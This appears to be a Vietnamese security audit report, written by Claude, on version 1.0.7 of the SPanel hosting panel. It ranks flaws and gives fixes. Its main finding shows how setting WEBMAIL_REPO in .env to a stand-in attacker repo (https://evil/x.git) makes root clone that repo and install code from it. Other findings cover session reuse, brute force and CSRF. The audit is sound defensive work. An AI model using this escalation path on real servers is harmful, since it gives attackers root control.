# Thẩm định SPanel — Lần 12: bản 1.0.7 sau khi merge PR #10

- **Repo:** `github.com/shostwp-byte/spanel`
- **Bản thẩm định:** nhánh `1.0.7` @ `cfab4f6`, đã merge vào `main` @ `544f296` (28/10/2026, 05:51). So với lần 11 (`34b71b9`) có thêm 16 commit (không tính merge), 31 file, +5441 / −1149 dòng (trong đó webmail mới 2601 dòng, README/docs ≈ 1000 dòng).
- **Kiểm chứng:** đọc diff `34b71b9..cfab4f6`; đối chiếu từng mục của lần 11; xem CI của PR và của `main`; xem tag/release trên GitHub. Không chạy trên VPS.
- **Ngày lập:** 28/10/2026 · **Thực hiện:** Claude (Anthropic)

---

## Kết luận

**Các lỗi P0/P1 của lần 11 đã được sửa đúng hướng, nhưng bản 1.0.7 chưa tới tay người dùng, và PR này mang vào một lỗi P0 mới.**

- **P0-A (mới):** user `spanel` lên được **root** qua biến `WEBMAIL_REPO` trong `.env` (xem mục 1).
- **P0-B (phát hành):** tag `v1.0.7` (release "Latest") đang trỏ vào `0573afa` — **trùng commit với `v1.0.6`**, và nằm trước PR #8, #9, #10. `update.sh` mặc định cập nhật theo tag mới nhất ⇒ **không máy nào nhận được các bản sửa này**.
- CI của PR #10 đỏ ở "Large deletion guard" (`wordpress_manager.py` −501, `App.jsx` −307) và đã merge **không có nhãn** `allow-large-deletion`. Ta đã rà: phần xoá là hợp lệ (mã chết; import tĩnh chuyển sang lazy), không mất tính năng.

Điểm: **≈ 70** tại `544f296`; **≈ 73** sau khi sửa P0-A, P0-B và P1.

---

## 0. Quy tắc khi sửa

1. PR #10 đã merge. Sửa trên **nhánh mới tách từ `main`** (ví dụ `fix/1.0.8-round12`), mở PR mới. Không commit thẳng vào `main`, không sửa lại nhánh `1.0.7`.
2. Mỗi mục là một commit riêng, message dạng `fix(mail): ...`.
3. Mỗi mục P0/P1 có test gọi hàm thật (không chỉ grep chuỗi trong file).
4. CI xanh cả 6 job trước khi merge. Nếu guard đỏ vì xoá hợp lệ, người review gắn nhãn **trước** khi merge.

---

## 1. P0 — Phải sửa trước khi phát hành

### P0-A. `WEBMAIL_REPO` trong `.env` cho user `spanel` chạy mã bằng root

**Vị trí:** `installer/files/spanel-helper.sh`, `mail_install_webmail`, dòng 3469, 3478, 3484–3494, 3509–3511 (commit `c4dc108`).

**Cơ chế:**

1. Ở `34b71b9`, `WEBMAIL_REPO` là hằng số trong helper (file của root). `c4dc108` đổi thành `custom_repo="$(env_get WEBMAIL_REPO)"`, đọc từ `/opt/spanel/backend/.env`.
2. `.env` thuộc `spanel:spanel` (`chown_backend_except_venv`, `install.sh` dòng 743–748).
3. Giá trị nào không chứa chuỗi `shostwp-byte/spanel` → root chạy `git clone "$custom_repo"` rồi `venv/bin/python -m pip install -r src/backend/requirements.txt`.
4. Kẻ chiếm được tiến trình panel (user `spanel`) ghi `WEBMAIL_REPO=https://evil/x.git` vào `.env`, gọi `sudo spanel-helper mail-install <host>`. `requirements.txt` của kẻ tấn công (`./pkg`, `git+…`) chạy `setup.py` **với uid 0**.

Đây đúng là ranh giới mà repo đang bảo vệ ở chỗ khác (giữ `.venv` thuộc root vì root thực thi file trong đó).

**Biến thể nhẹ hơn:** ứng viên `${APP_DIR}/installer/files/webmail/backend` (dòng 3478; và dòng ≈ 4736 trong `mail_reconfigure`). `/opt/spanel` thuộc `spanel`, nên `spanel` tạo được đường dẫn này. Nó chỉ được dùng khi `/usr/local/lib/spanel/webmail/backend` không có — nhưng khi đó root cài `main.py` của `spanel` rồi chạy nó dưới user webmail và `pip install` requirements của nó bằng root.

**Sửa:**

- Bỏ `WEBMAIL_REPO` khỏi `.env`; nếu cần tuỳ biến, chỉ đọc từ file thuộc root (ví dụ `/etc/spanel/helper.conf`, 0600 root).
- Bỏ ứng viên `${APP_DIR}/…` ở cả `mail_install_webmail` và `mail_reconfigure`; chỉ dùng thư mục root-owned `/usr/local/lib/spanel/webmail` (và `/opt/spanel-source` nếu thư mục này thuộc root — kiểm).
- `pip install` với phiên bản ghim + `--require-hashes`, hoặc chạy pip dưới user `SPanel-webmail`.

**Tiêu chí:** `grep -n "env_get WEBMAIL_REPO" installer/files/spanel-helper.sh` không còn; test (bats hoặc pytest gọi helper với `ENV_FILE` giả) chứng minh `.env` có `WEBMAIL_REPO` lạ → không `git clone`.

### P0-B. Tag `v1.0.7` không chứa bản 1.0.7

**Hiện trạng trên GitHub:**

| Tag | Commit | Ghi chú |
|---|---|---|
| `v1.0.6` | `0573afa` (24/10) | |
| `v1.0.7` | `0573afa` (24/10) | Release "Latest" đăng 21/10 → tag đã bị dời sau khi đăng |
| `v.10.7` | `91540ee` | Tag gõ nhầm |

`main` hiện ở `544f296`, hơn `0573afa` 129 commit (gồm PR #3–#10). `VERSION` ở cả hai đều là `1.0.7`.

`update.sh`: `UPDATE_CHANNEL=release` mặc định, `latest_release_tag` lấy tag lớn nhất khớp `v[0-9]*.[0-9]*.[0-9]*` ⇒ `v1.0.7` ⇒ `0573afa`. Máy khách không nhận P0-1, P0-2, webmail, phân quyền… và có thể tưởng mình đã ở bản mới nhất.

**Sửa:**

1. Sau khi xong P0-A: tăng `VERSION` lên `1.0.8`, cập nhật CHANGELOG, tạo tag **mới** `v1.0.8` trên `main` và release. **Không dời** `v1.0.7` lần nữa (máy đã cập nhật giữa 21–24/10 đang mang hai nội dung khác nhau cùng tên).
2. Xoá tag `v.10.7`.
3. Đặt quy tắc: tag release không bao giờ force-push; mỗi tag trỏ một commit khác nhau.

---

## 2. P1 — Sửa trong bản 1.0.8

### P1-1. Phiên SSO webmail đọc được hộp thư của khách khác sau khi đổi chủ domain

- **Vị trí:** `installer/files/webmail/backend/main.py` dòng 80, 198–216, 284–296, 661.
- Phiên SSO sống 7 ngày; mỗi request đăng nhập IMAP bằng `<email>*spanel-webmail` + master password, không hỏi lại panel. Không có gì dọn file phiên.
- **Kịch bản:** khách A mở `info@x.com` qua SSO rồi xoá domain. Khách B thêm `x.com`, tạo `info@x.com`. Cookie cũ của A vẫn đọc thư của B tới 7 ngày.
- **Sửa:** TTL ngắn cho phiên master (ví dụ 1–2 giờ); lưu mã thế hệ hộp thư (id + thời điểm tạo) trong phiên và so mỗi request; `mail-delete-box` / xoá domain xoá phiên tương ứng.

### P1-2. Đăng nhập webmail không giới hạn thử mật khẩu

- **Vị trí:** `main.py` dòng 676–697; vhost Nginx webmail (`spanel-helper.sh` ≈ 3592–3611) không có `limit_req`.
- Dovecot thấy mọi đăng nhập từ `127.0.0.1`, fail2ban bỏ qua `127.0.0.1/8` ⇒ không chặn được theo IP; phạt IP đó thì phạt mọi người.
- **Sửa:** giới hạn theo IP (lấy từ `X-Forwarded-For` do Nginx đặt) và theo địa chỉ email ở `/api/auth/login`, hoặc `limit_req` ở Nginx.

### P1-3. Mật khẩu có ký tự không phải ASCII không đăng nhập được webmail

- **Vị trí:** `main.py` dòng 311. `imaplib` mã hoá LOGIN bằng ASCII → `UnicodeEncodeError` (không bị bắt) → HTTP 500. Panel cho phép mật khẩu như `mậtkhẩu123`.
- **Sửa:** `authenticate("PLAIN", …)` với bytes UTF-8 (hoặc `conn._encoding = "utf-8"`), bắt lỗi mã hoá trả 401.

### P1-4. Sau khi cập nhật panel, tab đang mở bị trắng màn hình

- **Vị trí:** `frontend/src/App.jsx` dòng 16 (`lazyNamed`), 742 (`loadAceBundle`), 4931 (`Suspense`); `Websites.jsx` dòng 8.
- `f380eb6` tách trang thành chunk lazy. `update.sh` (dòng 2252) chạy `rm -rf dist` rồi build lại ⇒ chunk cũ mất. Tab đang mở bấm sang trang chưa tải → 404 → `React.lazy` ném lỗi; không có `ErrorBoundary` hay `vite:preloadError` ⇒ cả app unmount. `_aceBundlePromise` bị reject giữ nguyên ⇒ trình sửa mã trống tới khi tải lại trang.
- **Sửa:** `ErrorBoundary` quanh `Suspense`, gặp lỗi tải chunk thì `location.reload()` một lần; `window.addEventListener('vite:preloadError', …)`; đặt lại `_aceBundlePromise = null` khi reject.

### P1-5. Endpoint chuyển chủ website chưa hoàn chỉnh (tiếp P1-4 lần 11)

- **Vị trí:** `backend/app/api/websites.py`, `transfer_website_owner` (≈ dòng 1826).
- Chỉ có API, **không có giao diện** gọi tới (`grep transfer-owner frontend/` rỗng).
- Không chuyển `SftpAccount` (giữ `owner_id` cũ, `chroot_path` trỏ thư mục đã bị dời ⇒ SFTP hỏng), `SiteApp`, `MailDomain` / `MailAccount`. Các bảng này `ondelete=CASCADE` theo `owner_id` ⇒ xoá tài khoản Reseller cũ sau khi chuyển sẽ xoá luôn bản ghi SFTP/mail của site đã chuyển.
- Không kiểm giới hạn gói (số website, dung lượng) của chủ mới; `move_site_runtime` lỗi giữa chừng không rollback.
- **Sửa:** chuyển đủ bản ghi liên quan (hoặc từ chối khi còn SFTP/mail và nói rõ), kiểm giới hạn gói, thêm nút ở trang Domains/Users cho admin, test cả vòng.

---

## 3. P2 — Thấp, làm sau

**Backend / WordPress**

1. **WordPress trong thư mục con:** bật "chặn PHP trong uploads" chỉ ghi `.htaccess` (Nginx không đọc). Mục kiểm vẫn báo đạt vì `"php" in uploads_ht`. Nên trả "không hỗ trợ" hoặc thêm `location` qua include (yêu cầu lần 11 chưa làm). `_vhost_blocks_uploads_php` tìm chuỗi `/wp-content/uploads/` không có trong template (template dùng regex `/(?:uploads|files)/.*\.php$`), nên thực tế chỉ dựa vào `app_type`.
2. **Lọc DEFINER chạy trên cả dòng dữ liệu** (`mariadb._strip_sql_definers`): bài viết chứa chuỗi ``DEFINER=`x`@`y` `` bị sửa nội dung khi import. Nên chỉ áp cho dòng bắt đầu bằng `CREATE`, `/*!50013`, `/*!50017`, `/*!50003`. Bước này còn chép toàn bộ dump sang `/tmp` (gấp đôi dung lượng; `/tmp` là tmpfs trên Debian 13).
3. **Mã nhận biết test trong mã chạy thật:** `_open_tenant_regular_file_fd` dùng `"unittest" in sys.modules` để nới kiểm uid sang `os.getuid()` (tức uid `spanel`); `db_backends` / `remote_mysql` / `mariadb.import_database_as_panel` so sánh hàm có bị monkeypatch không. Nên bỏ, để test tự patch `pwd.getpwnam`.
4. **`write_wp_file_text` quay về ghi bằng tiến trình panel** khi helper từ chối, với kiểm symlink tách khỏi lần ghi (TOCTOU). Tên file cố định nên tác hại thấp, nhưng helper đã từ chối thì nên dừng. `delete_wp_path` cũng `unlink` bằng panel trước khi gọi helper.

**Webmail / mail-install**

5. **CSRF:** chỉ dựa vào `SameSite=Lax`; `/api/messages/send` nhận `multipart/form-data`, các API JSON không kiểm Content-Type. Trên origin dùng chung `https://<panel-host>:2096`, trang cùng site gửi được thư hoặc xoá vĩnh viễn thư. Thêm kiểm `Origin` / header tuỳ biến, `SameSite=Strict`.
6. **`mail_reconfigure` (do `update.sh` gọi) chép `main.py` mới nhưng không `pip install`;** `requirements.txt` chỉ chép khi `main.py` đổi.
7. **Khoá `flock`** chỉ bọc `mail-install` / `mail-remove`, không bọc `mail-reconfigure` / `mail-configure` (sửa cùng file Exim/Dovecot).
8. **Lưu nháp:** xoá + expunge bản cũ trước khi APPEND bản mới ⇒ APPEND lỗi (đầy quota) là mất nháp.
9. **Tên hiển thị chứa CR/LF** làm mọi lần gửi trả 500 (không phải injection, nhưng khoá người dùng).
10. **Đổi `WEBMAIL_REPO`** trên checkout có sẵn vẫn fetch remote cũ (vô nghĩa sau P0-A).
11. `tests/test_mail_webmail.py`: test đầu chỉ grep chuỗi trong helper.

**Frontend / hiệu năng**

12. **Ngay sau đăng nhập, admin có thể chỉ thấy website của chính mình:** `login()` đặt `isAuthenticated` trước `loadCurrentUser()` ⇒ lượt render đầu gửi `X-Access-Role: user`; hai request `/websites` chạy đua (App.jsx 1514, 1583, 2903–2907).
13. **Công tắc Access Role chỉ thu hẹp được Websites / App Installer / WordPress Manager;** Databases, Users, Backups, mail, DNS… vẫn theo vai trò thật. Không phải leo quyền (header chỉ thu hẹp), nhưng dễ gây hiểu nhầm — ghi rõ là "xem trước giao diện" hoặc áp header ở các hàm lọc chung.
14. **CORS:** `allow_headers` (main.py dòng 120) thiếu `X-Access-Role` ⇒ chạy frontend khác origin (dev Vite :5173, hoặc đặt `CORS_ORIGINS`) thì mọi API sau đăng nhập lỗi preflight. Production cùng origin không bị.
15. **App Installer không còn vai trò nào vào được:** `82949d8` bỏ `app_installer` khỏi `USER_ALLOWED_PAGES`, trong khi API chặn Admin/Reseller. Route và trang `AppInstaller.jsx` thành mồ côi. Xác nhận ý định: bỏ hẳn hoặc trả lại menu.
16. **GZip (mức 9) nén cả file tải về lớn** (dump SQL, tải từ File Manager): tốn CPU, mất `Content-Length`. Dùng `compresslevel=5` và `exclude_content_types` cho `application/sql`, `application/x-tar`, `application/octet-stream`.

---

## 4. Đối chiếu lần 11

| Lần 11 | Trạng thái ở `cfab4f6` |
|---|---|
| P0-1 Clone đọc file khách (lộ `.my.cnf`) | **Đã sửa** (`90aee4a`, cách B): mở `O_NOFOLLOW`, `fstat` kiểm `S_ISREG` + `st_uid` trên fd. Symlink thư mục cha cũng không lọt vì file phải thuộc uid của khách. Còn P2-3 (nhánh nới uid khi có `unittest`). |
| P0-2 Ghi đè vhost khi bật chặn PHP uploads | **Đã sửa** (`87dd7be`): dùng `_rewrite_website_vhost`, commit `app_type` sau khi ghi vhost, lỗi trả 500; 3 lời gọi thẳng `nginx.rewrite_vhost(` đã hết. Subpath: không đổi `app_type`, nhưng chưa chặn thật — P2-1. |
| P1-1 Mã chết / guard | **Đã dọn** (`867cb78`), `grep "if False"` rỗng. Guard vẫn đỏ, **merge không gắn nhãn**. |
| P1-2 DEFINER | **Đã sửa** (`25e9690`), kể cả DB từ xa. Còn P2-2 (lọc cả dòng dữ liệu). |
| P1-3 Import quay về tài khoản toàn quyền | **Đã sửa**: `import_database_as_tenant` ném lỗi khi thiếu thông tin; `backup_verify` dùng `_as_panel`; `remote_mysql` nhận tài khoản khách. |
| P1-4 Dữ liệu cũ thuộc Admin/Reseller | **Một phần** (`c4f530a`): `update.sh` in cảnh báo, có API chuyển chủ. Chưa có UI, chuyển thiếu bản ghi — P1-5. |
| P2-1 Test ghi vào `spanel.db` thật | **Đã giảm**: bỏ ghi file khi engine `:memory:`. |
| P2-2 DB mồ côi khi Clone hỏng | **Đã sửa**: `_cleanup_created_clone_db`. |
| P2-3 Kiểm `uploads_php_blocked` theo file đánh dấu | **Một phần** — xem P2-1. |
| P2-4 `readme.html` giả | **Đã bỏ.** |
| P2-5 Nút Donate / reduced-motion | **Đã sửa.** |
| P2-6 CI `npm install --ignore-scripts` | **Đã sửa.** |

**Phần mới khác đã xem, không thấy lỗi:** `App.jsx` −307 dòng (45 import tĩnh → lazy, đủ export; ace chuyển sang tải động; bỏ import `Terminal`/`AIAssistant` không dùng; trang Notifications chia tab vẫn chỉ admin); header cache (`index.html` `no-store`, `immutable` chỉ cho `/assets/`); guard demo-mode; `update.sh` `backup_db` chạy `find` trong `snap_dir`; webmail: iframe `srcdoc` sandbox không script, không IMAP injection, đính kèm không ghi đĩa, service chạy user riêng với `NoNewPrivileges`.

---

## 5. Bảng điểm

| Trụ cột | Trọng số | L10 | L11 | **L12** | Lý do thay đổi |
|---|---:|---:|---:|---:|---|
| 1. Bảo mật & tách đặc quyền | 15% | 56 | 57 | **58** | P0-1 đóng; P0-A mới (spanel → root qua `.env`) |
| 2. Tự vá lỗi & cập nhật | 12% | 72 | 72 | **68** | Tag `v1.0.7` = `v1.0.6`, bản sửa không phát hành; tag bị dời |
| 3. Chịu lỗi & tự phục hồi | 12% | 70 | 70 | **71** | Dọn DB mồ côi; vhost lỗi không còn bị nuốt |
| 4. Sao lưu & DR | 10% | 75 | 75 | **76** | Restore dùng tài khoản khách, lọc DEFINER |
| 5. Chịu tải & cách ly | 12% | 72 | 72 | **72** | |
| 6. Đa runtime | 10% | 71 | 71 | **73** | P0-2 đóng |
| 7. WHMCS & hệ sinh thái | 10% | 70 | 70 | **70** | |
| 8. UX, RBAC & giám sát | 7% | 76 | 78 | **78** | Tải nhanh hơn; nhưng trắng trang sau cập nhật, App Installer mồ côi |
| 9. Mail & DNS | 6% | 69 | 69 | **70** | Webmail tự chứa; còn SSO 7 ngày, brute force |
| 10. Cụm đa máy chủ | 6% | 56 | 56 | **56** | |
| **Tổng** | 100% | ≈ 69 | ≈ 69 | **≈ 70** | ≈ 73 sau P0-A, P0-B và P1 |

*Giới hạn: chỉ đọc mã, log CI và tag/release trên GitHub; không chạy trên VPS, không khai thác thử P0-A. Phần webmail và frontend được rà bởi agent phụ, các điểm chính (P0-A, CORS, App Installer, thiếu ErrorBoundary, `rm -rf dist`) đã được kiểm lại trực tiếp trên mã. Thực hiện bởi Claude (AI của Anthropic). Mã của PR #10 không phải do Claude viết.*
